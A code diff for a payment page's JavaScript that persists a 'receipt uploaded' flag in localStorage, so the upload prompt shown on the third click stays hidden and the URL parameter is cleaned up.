@@ -103,6 +103,7 @@
     const END_TIME_KEY = "paystack_timer";
     const CLICK_COUNT_KEY = "paystack_clicks";
     const ACC_INDEX_KEY = "paystack_account_index";
+    const UPLOADED_KEY = "paystack_uploaded";
 
     // Set FormSubmit redirect back to the current page URL
     document.getElementById("redirect-url").value = window.location.href.split('?')[0] + "?uploaded=true";
@@ -176,8 +177,10 @@
 
       paymentSection.classList.add("hidden");
 
-      // Triggers specifically on the 3rd click unless already uploaded
-      if (nextClicks === 3 && !window.location.search.includes("uploaded=true")) {
+      const hasUploaded = localStorage.getItem(UPLOADED_KEY) === "true";
+
+      // Triggers on 3rd click unless receipt was previously submitted
+      if (nextClicks === 3 && !hasUploaded) {
         uploadSection.style.display = "block";
         return;
       }
@@ -198,8 +201,15 @@
       }
     }
 
-    // Check if returning from uploading a receipt
-    if (window.location.search.includes("uploaded=true")) {
+    // Check URL parameters or local storage to verify upload completion
+    if (window.location.search.includes("uploaded=true") || localStorage.getItem(UPLOADED_KEY) === "true") {
+      localStorage.setItem(UPLOADED_KEY, "true");
+      
+      // Clean up URL parameter if present
+      if (window.location.search.includes("uploaded=true")) {
+        window.history.replaceState({}, document.title, window.location.pathname);
+      }
+
       paymentSection.classList.add("hidden");
       loadingScreen.style.display = "block";
       setTimeout(() => {
